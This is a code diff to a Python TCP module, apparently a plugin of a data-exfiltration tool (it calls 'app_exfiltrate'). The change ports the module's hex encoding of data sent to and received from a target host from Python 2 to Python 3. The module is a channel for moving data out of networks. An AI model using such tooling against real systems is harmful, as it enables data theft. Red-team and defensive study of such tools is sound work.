@@ -12,7 +12,8 @@ def send(data):
         'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((target, port))
-    client_socket.send(data.encode('hex'))
+    payload = (data.encode('utf-8') if isinstance(data, str) else data).hex()
+    client_socket.send(payload.encode('ascii'))
     client_socket.close()
 
 
@@ -43,8 +44,8 @@ def listen():
                     app_exfiltrate.log_message(
                         'info', "[tcp] Received {} bytes".format(len(data)))
                     try:
-                        data = data.decode('hex')
-                        app_exfiltrate.retrieve_data(data)
+                        app_exfiltrate.retrieve_data(
+                            bytes.fromhex(data.decode('ascii')))
                     except Exception as e:
                         app_exfiltrate.log_message(
                             'warning', "[tcp] Failed decoding message {}".format(e))
